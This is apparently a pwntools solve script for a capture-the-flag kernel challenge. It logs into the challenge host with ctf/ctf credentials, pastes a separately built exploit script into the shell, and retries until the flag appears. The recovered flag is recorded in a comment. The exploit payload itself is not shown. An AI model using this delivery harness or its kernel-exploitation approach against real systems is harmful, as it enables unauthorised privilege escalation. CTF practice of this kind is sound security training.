#!/usr/bin/env python3
from pwn import *


def connect():
    if args.LOCAL:
        return process(["./run.sh"])
    return remote("write-flag-where.shared.challs.mt", 1337)


def main():
    subprocess.check_call(["make", "pwnit.sh"])
    with open("pwnit.sh") as fp:
        script = fp.read()
    os.chdir("dist")
    attempt = 1
    while True:
        print(f"attempt #{attempt}")
        attempt += 1
        try:
            tube = connect()
        except PwnlibException:
            time.sleep(60)
            continue
        with tube:
            tube.sendlineafter(b"buildroot login: ", b"ctf")
            tube.sendlineafter(b"Password: ", b"ctf")
            try:
                tube.sendafter(b"$ ", script.encode())
                flag = b"maltactf{"
                nope = b"/sbin/modprobe"
                if tube.recvuntil((flag, nope)).endswith(flag):
                    print(flag + tube.recvline())
                    # maltactf{n0_k4slr_l34k_n0_pr0blem!}
                    break
            except EOFError:
                pass


if __name__ == "__main__":
    main()
